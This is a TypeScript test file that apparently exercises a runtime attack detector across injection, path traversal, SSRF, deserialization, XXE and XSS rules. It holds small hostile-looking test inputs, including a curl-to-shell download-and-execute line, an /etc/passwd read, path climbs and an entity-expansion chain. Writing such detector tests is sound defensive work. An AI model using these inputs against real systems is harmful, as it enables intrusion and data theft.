/**
 * Each structural check, proved with one value built from the structure it
 * tests, beside the safe counterpart that must not fire. No payload lists:
 * every value here is assembled from the property under test (a value that
 * spans several tokens, a path that climbs out of its directory, an address
 * in a private range, a document that declares an external entity).
 */
import { tmpdir } from 'os';
import {
  detectArgv,
  detectCode,
  detectCommand,
  detectDeserialization,
  detectNoSql,
  detectOutbound,
  detectPath,
  detectShellSpawn,
  detectSql,
  detectSsrf,
  detectXml,
  detectXss,
  isPrivateAddress,
  METADATA_HOSTS,
} from '../detect';
import { codeTokens, overlapping, shellTokens, sqlTokens } from '../lexers';
import { addInput, addModelOutput, modelFragments, percentDecode } from '../normalize';
import type { RaspInput } from '../types';
import dnslog from '../data/dnslog-domains.json';

const req = (value: string, key = 'query.q'): RaspInput[] => {
  const out: RaspInput[] = [];
  addInput(out, value, key);
  return out;
};
const model = (text: string): RaspInput[] => {
  const out: RaspInput[] = [];
  addModelOutput(out, text);
  return out;
};
const sqlQuote = (v: string) => `'${v.replace(/'/g, "''")}'`;
const shQuote = (v: string) => `'${v.replace(/'/g, "'\\''")}'`;

describe('lexers', () => {
  it('SQL: a qualified name is one token, a string with doubled quotes is one token', () => {
    const q = `SELECT ${['db', 'tbl'].join('.')} FROM t WHERE a = ${sqlQuote("x'y")}`;
    const kinds = sqlTokens(q).map((t) => t.kind);
    expect(kinds).toEqual(['word', 'name', 'word', 'word', 'word', 'word', 'op', 'string']);
  });

  it('SQL: placeholders are single tokens', () => {
    for (const p of ['?', '$1', ':name', '@name', '%s', '%(name)s']) {
      expect(sqlTokens(`a = ${p}`).map((t) => t.kind)).toEqual(['word', 'op', 'placeholder']);
    }
  });

  it('shell: a quoted segment stays inside one word', () => {
    const { tokens } = shellTokens(`grep ${shQuote('a b|c')} f`);
    expect(tokens.map((t) => t.kind)).toEqual(['word', 'word', 'word']);
  });

  it('overlap uses half-open ranges', () => {
    const toks = codeTokens('ab cd');
    expect(overlapping(toks, 0, 2)).toHaveLength(1);
    expect(overlapping(toks, 1, 3)).toHaveLength(2);
  });

  it('percent decoding is lenient and adds decoded forms once and twice', () => {
    expect(percentDecode('a%2Fb%zz')).toBe('a/b%zz');
    const twice = encodeURIComponent(encodeURIComponent('a/b'));
    expect(req(twice).map((i) => i.value)).toEqual([twice, encodeURIComponent('a/b'), 'a/b']);
  });

  it('model output splits into fenced blocks, then lines', () => {
    const fence = '`'.repeat(3);
    expect(modelFragments(`intro\n${fence}\nline one\nline two\n${fence}\noutro`)).toEqual(['line one\nline two', 'intro', 'line one', 'line two', 'outro']);
  });
});

describe('sql_injection', () => {
  // A value made of three non-keyword tokens: identifier, operator, identifier.
  const spanning = ['col', '=', 'col'].join(' ');

  it('sqli.userinput: an input that spans several tokens of the query', () => {
    expect(detectSql(`SELECT * FROM t WHERE a = ${spanning}`, req(spanning))?.rule).toBe('sqli.userinput');
  });

  it('safe: the same input bound as one string literal', () => {
    expect(detectSql(`SELECT * FROM t WHERE a = ${sqlQuote(spanning)}`, req(spanning))).toBeNull();
  });

  it('safe: a sort parameter made only of anti-detect keywords and one identifier', () => {
    const sort = ['name', 'desc'].join(' ');
    expect(detectSql(`SELECT * FROM t ORDER BY ${sort}`, req(sort))).toBeNull();
  });

  it('sqli.stacked: a statement separator inside the input, followed by another token', () => {
    // Keywords only, so the token-structure rule's anti-detect filter lets it pass.
    const kw = 'desc';
    const value = [kw, kw].join(';');
    expect(detectSql(`SELECT * FROM t ORDER BY a ${value}`, req(value))?.rule).toBe('sqli.stacked');
    expect(detectSql(`SELECT * FROM t ORDER BY a ${kw}`, req(kw))).toBeNull();
  });

  it('sqli.model_output: a model fragment spanning tokens, or a whole write statement', () => {
    expect(detectSql(`SELECT * FROM t WHERE ${spanning}`, model(spanning))?.rule).toBe('sqli.model_output');
    const write = ['UPDATE', 't', 'SET', 'a', '=', '1'].join(' ');
    expect(detectSql(write, model(write))?.rule).toBe('sqli.model_output');
  });

  it('safe: a read-only SELECT the model wrote whole (text-to-SQL)', () => {
    const read = ['SELECT', 'a', 'FROM', 't'].join(' ');
    expect(detectSql(read, model(read))).toBeNull();
  });

  it('safe: the whole query equal to an input (a SQL console)', () => {
    const q = `SELECT * FROM t WHERE ${spanning}`;
    expect(detectSql(q, req(q))).toBeNull();
  });
});

describe('nosql_injection', () => {
  const op = '$' + 'ne';

  it('nosqli.operator: an operator object from the request body reaches the filter', () => {
    const body = { user: { [op]: '' } };
    expect(detectNoSql({ user: body.user }, [body], [])?.rule).toBe('nosqli.operator');
  });

  it('safe: the server builds the operator itself', () => {
    const body = { user: 'alice' };
    expect(detectNoSql({ user: { [op]: body.user } }, [body], [])).toBeNull();
  });

  it('nosqli.where: a tainted fragment spanning code tokens inside $where', () => {
    const value = ['a', '||', 'b'].join(' ');
    expect(detectNoSql({ $where: `this.x == ${value}` }, [{}], req(value))?.rule).toBe('nosqli.where');
    expect(detectNoSql({ $where: `this.x == ${JSON.stringify(value)}` }, [{}], req(value))).toBeNull();
  });
});

describe('command_injection and shell_spawn', () => {
  const value = ['a', 'b'].join(';');

  it('cmdi.userinput: an input that spans several shell tokens', () => {
    expect(detectCommand(`ls ${value}`, req(value))?.rule).toBe('cmdi.userinput');
    expect(detectCommand(`ls ${shQuote(value)}`, req(value))).toBeNull();
  });

  it('cmdi.substitution: a word-splitting variable inside one word', () => {
    const v = ['a', 'b'].join('${IFS}');
    expect(detectCommand(`echo ${v}`, req(v))?.rule).toBe('cmdi.substitution');
    expect(detectCommand('echo a_b', req('a_b'))).toBeNull();
  });

  it('cmdi.full: the command equals an input', () => {
    expect(detectCommand('uptime', req('uptime'))?.rule).toBe('cmdi.full');
  });

  it('cmdi.model_output: a whole model command with more than one command', () => {
    const two = ['git status', 'git log'].join(' && ');
    expect(detectCommand(two, model(two))?.rule).toBe('cmdi.model_output');
    expect(detectCommand('git status', model('git status'))).toBeNull();
  });

  it('cmdi.executable: argv[0] equals an input', () => {
    expect(detectArgv(['report-tool', '-x'], req('report-tool'))?.rule).toBe('cmdi.executable');
    expect(detectArgv(['convert', 'report-tool'], req('report-tool'))).toBeNull();
  });

  it('shell_spawn.shell during a request, unless allowed; download_exec at any time', () => {
    expect(detectShellSpawn({ argv0: '/bin/sh', inRequest: true, allow: [] })?.rule).toBe('shell_spawn.shell');
    expect(detectShellSpawn({ argv0: '/bin/sh', inRequest: true, allow: ['sh'] })).toBeNull();
    expect(detectShellSpawn({ argv0: '/bin/sh', inRequest: false, allow: [] })).toBeNull();
    const pipe = ['curl -s https://example.com/x', 'sh'].join(' | ');
    expect(detectShellSpawn({ command: pipe, inRequest: false, allow: [] })?.rule).toBe('shell_spawn.download_exec');
  });
});

describe('path_traversal and file_write', () => {
  const root = '/srv/app/uploads';

  it('path.traversal: the input climbs out of its directory', () => {
    const climb = ['..', '..', 'x.txt'].join('/');
    expect(detectPath(`${root}/${climb}`, 'read', req(climb))?.rule).toBe('path.traversal');
    expect(detectPath(`${root}/x.txt`, 'read', req('x.txt'))).toBeNull();
  });

  it('path.absolute: the input is an absolute path the call uses', () => {
    const abs = ['', 'srv', 'other', 'x.txt'].join('/');
    expect(detectPath(abs, 'read', req(abs))?.rule).toBe('path.absolute');
  });

  it('path.nullbyte: the input carries a NUL and the path holds what comes before it', () => {
    const v = ['x.txt', 'png'].join('\0.');
    expect(detectPath(`${root}/x.txt`, 'read', req(v))?.rule).toBe('path.nullbyte');
  });

  it('path.outside_root: a tainted path outside every allowed root', () => {
    expect(detectPath(`/srv/app/other/x.txt`, 'read', req('x.txt'), [root])?.rule).toBe('path.outside_root');
    expect(detectPath(`${root}/x.txt`, 'read', req('x.txt'), [root])).toBeNull();
  });

  it('path.sensitive: a tainted path that resolves to a well-known secret file', () => {
    expect(detectPath(`/etc/${'passwd'}`, 'read', req('passwd'))?.rule).toBe('path.sensitive');
    expect(detectPath(`/etc/${'passwd'}`, 'read', req('report.pdf'))).toBeNull();
  });

  it('file_write.script: a request writes an executable script name; ntfs streams', () => {
    const name = ['upload', 'js'].join('.');
    expect(detectPath(`${tmpdir()}/${name}`, 'write', req(name))?.rule).toBe('file_write.script');
    expect(detectPath(`${tmpdir()}/${name}`, 'read', req(name))).toBeNull();
    expect(detectPath(`${root}/x.txt${'::$DATA'}`, 'write', [])?.rule).toBe('file_write.ntfs');
  });
});

describe('ssrf (address class) and outbound', () => {
  const url = (host: string, scheme = 'http') => `${scheme}://${host}/`;

  it('ssrf.internal: a tainted host in a private range, by literal or by resolved address', () => {
    const host = [10, 0, 0, 5].join('.');
    expect(detectSsrf(url(host), req(host))?.rule).toBe('ssrf.internal');
    expect(detectSsrf(url('svc.example.com'), req('svc.example.com'), [host])?.rule).toBe('ssrf.internal');
    expect(detectSsrf(url(host), req('report.pdf'))).toBeNull();
    const pub = [93, 184, 216, 34].join('.');
    expect(detectSsrf(url(pub), req(pub))).toBeNull();
  });

  it('address classes: IPv4-mapped IPv6 is decoded first', () => {
    expect(isPrivateAddress(`::ffff:${[127, 0, 0, 1].join('.')}`)).toBe(true);
    expect(isPrivateAddress(`::ffff:${[93, 184, 216, 34].join('.')}`)).toBe(false);
    expect(isPrivateAddress('fe80::1')).toBe(true);
  });

  it('ssrf.metadata: tainted cloud metadata host; untainted SDK calls pass', () => {
    const host = METADATA_HOSTS[0];
    expect(detectSsrf(url(host), req(host))?.rule).toBe('ssrf.metadata');
    expect(detectSsrf(url(host), req('report.pdf'))).toBeNull();
  });

  it('ssrf.obfuscated: a loopback address written as one decimal number', () => {
    const decimal = String(((127 << 24) | 1) >>> 0);
    expect(detectSsrf(url(decimal), req(decimal))?.rule).toBe('ssrf.obfuscated');
  });

  it('ssrf.protocol: a tainted host under a non-HTTP scheme', () => {
    expect(detectSsrf(url('files.example.com', 'gopher'), req('files.example.com'))?.rule).toBe('ssrf.protocol');
    expect(detectSsrf(url('files.example.com', 'https'), req('files.example.com'))).toBeNull();
  });

  it('ssrf.dnslog: a tainted host under a known out-of-band domain', () => {
    const host = `probe${dnslog.domains[0]}`;
    expect(detectSsrf(url(host), req(host))?.rule).toBe('ssrf.dnslog');
  });

  it('outbound.not_allowed: only with a non-empty allow-list', () => {
    expect(detectOutbound(url('api.example.com'), ['*.example.org'])?.rule).toBe('outbound.not_allowed');
    expect(detectOutbound(url('api.example.org'), ['*.example.org'])).toBeNull();
    expect(detectOutbound(url('api.example.com'), [])).toBeNull();
  });
});

describe('deserialization and code_injection (taint checks)', () => {
  it('deser.pickle: tainted data always fires; untainted data never', () => {
    const data = Buffer.from([0x80, 4, 0x95]).toString('latin1') + 'payload-bytes';
    expect(detectDeserialization('pickle', data, req(data))?.rule).toBe('deser.pickle');
    expect(detectDeserialization('pickle', data, req('report.pdf'))).toBeNull();
  });

  it('deser.typename: tainted JSON that names a type; plain JSON passes', () => {
    const typed = JSON.stringify({ ['$' + 'type']: 'Some.Type', v: 1 });
    expect(detectDeserialization('typename', typed, req(typed))?.rule).toBe('deser.typename');
    const plain = JSON.stringify({ name: 'x', v: 1 });
    expect(detectDeserialization('typename', plain, req(plain))).toBeNull();
  });

  it('deser.java: a tainted Java object stream always fires; untainted data never', () => {
    const data = Buffer.from([0xac, 0xed, 0x00, 0x05]).toString('latin1') + 'payload-bytes';
    expect(detectDeserialization('java', data, req(data))?.rule).toBe('deser.java');
    expect(detectDeserialization('java', data, req('report.pdf'))).toBeNull();
  });

  it('deser.yaml (snakeyaml): a tainted global tag naming a Java class fires; standard tags pass', () => {
    const tagged = 'a: !!java.util.ArrayList []';
    expect(detectDeserialization('snakeyaml', tagged, req(tagged))?.rule).toBe('deser.yaml');
    expect(detectDeserialization('snakeyaml', tagged, req('report.pdf'))).toBeNull();
    const standard = 'name: !!str 12345';
    expect(detectDeserialization('snakeyaml', standard, req(standard))).toBeNull();
  });

  it('code.eval: a tainted value spanning code tokens; the same value as a string literal passes', () => {
    const value = ['a', '+', 'b'].join(' ');
    expect(detectCode(`f(${value})`, req(value))?.rule).toBe('code.eval');
    expect(detectCode(`f(${JSON.stringify(value)})`, req(value))).toBeNull();
  });
});

describe('xxe (external entity check)', () => {
  const doc = (subset: string) => `<?xml version="1.0"?><!DOCTYPE r [${subset}]><r>&e;</r>`;
  const external = (uri: string) => doc(`<!ENTITY e SYSTEM "${uri}">`);

  it('xxe.external_entity: tainted XML declaring an external entity, parser resolving them', () => {
    const x = external('https://example.com/defs.dtd');
    expect(detectXml(x, req(x, 'body'), true)?.rule).toBe('xxe.external_entity');
    expect(detectXml(x, req(x, 'body'), false)?.rule).toBe('xxe.doctype');
    expect(detectXml(x, req('report.pdf'), true)).toBeNull();
  });

  it('xxe.file: an external entity naming an absolute file that is not a DTD', () => {
    const x = external(`file://${['', 'srv', 'data', 'x.txt'].join('/')}`);
    expect(detectXml(x, req(x, 'body'), true)?.rule).toBe('xxe.file');
  });

  it('xxe.protocol: an external entity under a non-HTTP scheme', () => {
    const x = external('ftp://files.example.com/x');
    expect(detectXml(x, req(x, 'body'), true)?.rule).toBe('xxe.protocol');
  });

  it('xxe.billion_laughs: three internal entities that expand other entities', () => {
    const chain = ['<!ENTITY e0 "x">', ...[1, 2, 3].map((i) => `<!ENTITY e${i} "&e${i - 1};&e${i - 1};">`)].join('');
    const x = doc(chain);
    expect(detectXml(x, req(x, 'body'), true)?.rule).toBe('xxe.billion_laughs');
    const one = doc('<!ENTITY e "Acme">');
    expect(detectXml(one, req(one, 'body'), true)).toBeNull();
  });
});

describe('xss (monitor only)', () => {
  const tag = 'b';
  const value = `<${tag}>${'x'.repeat(16)}</${tag}>`;
  const escape = (v: string) => v.replace(/</g, '&lt;').replace(/>/g, '&gt;');

  it('xss.reflected: a markup-shaped input of 15+ characters reflected verbatim into HTML', () => {
    expect(detectXss('text/html', `<p>${value}</p>`, req(value))?.rule).toBe('xss.reflected');
  });

  it('safe: escaped, or not HTML', () => {
    expect(detectXss('text/html', `<p>${escape(value)}</p>`, req(value))).toBeNull();
    expect(detectXss('application/json', JSON.stringify({ value }), req(value))).toBeNull();
  });
});
